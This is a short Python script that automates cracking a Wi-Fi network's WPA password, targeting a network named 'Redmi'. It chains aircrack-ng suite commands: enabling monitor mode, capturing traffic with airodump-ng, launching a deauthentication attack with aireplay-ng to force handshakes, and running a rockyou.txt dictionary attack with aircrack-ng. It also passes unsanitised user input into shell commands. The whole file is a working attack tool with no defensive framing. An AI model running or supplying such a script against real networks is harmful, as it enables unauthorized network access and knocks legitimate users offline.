import subprocess
import re


def get_bssid_and_channel(dev_name='Redmi'):
    wifi_list = subprocess.run('nmcli device wifi list', shell=True, text=True, stdout=subprocess.PIPE)
    devices = wifi_list.stdout.split('\n')[1:]
    for data in devices:
        info = data.split()
        if info[1] == dev_name:
            bssid = info[0]
            channel = info[3]
            return bssid, channel
    return None


def get_wifi_card_name():
    nmcli_output = subprocess.run('nmcli', shell=True, text=True, stdout=subprocess.PIPE)
    network_pattern = r'wl[\d\w]+'
    raw_out = nmcli_output.stdout
    try:
        wifi_card_name = re.search(network_pattern, raw_out).group()
        return wifi_card_name
    except AttributeError:
        print('Sorry, unknown name of wifi card. Print name manually')
        wifi_card_name = input()
        return wifi_card_name


def enable_monitor_mod(wifi_card):
    subprocess.run(f'airmon-ng start {wifi_card}', shell=True, text=True)


def disable_monitor_mod(wifi_card):
    subprocess.run(f'airmon-ng stop {wifi_card}mon', shell=True, text=True)


# should we use threads?
def start_capturing_data(bssid, channel, wifi_card):
    filename = input('''Print filename with path where you want
                    to save capturing data: ''')
    subprocess.run(f'''gnome-terminal -x sh -c \'airodump-ng --bssid {bssid} --channel {channel} -w  {filename} {wifi_card}mon; bash\' ''',
                   shell=True)
    return filename


def deauth_attack(bssid, wifi_card, attempt_num=1000):
    attempt_num = input('''Write number of deauthorization attempts (optional = 1000): ''')
    subprocess.run(f'aireplay-ng --deauth {attempt_num} -a {bssid} --ignore-negative-one {wifi_card}mon',
                   shell=True, text=True)


def crack_with_dictionary(bssid, filename):
    raw_data = subprocess.run(f'aircrack-ng -w rockyou.txt -b {bssid} {filename}-01.cap',
                              shell=True, text=True, stdout=subprocess.PIPE)
    raw_text = raw_data.stdout
    print(raw_data)


if __name__ == '__main__':
    # get required data
    bssid, channel = get_bssid_and_channel('Redmi')
    wifi_card = get_wifi_card_name()

    # enable monitor mod start capturing data
    enable_monitor_mod(wifi_card)
    filename = start_capturing_data(bssid, channel, wifi_card)
    deauth_attack(bssid, wifi_card, 0)
    crack_with_dictionary(bssid, filename)

    # final stage of cracking. Disabling monitor mod
    disable_monitor_mod(wifi_card)
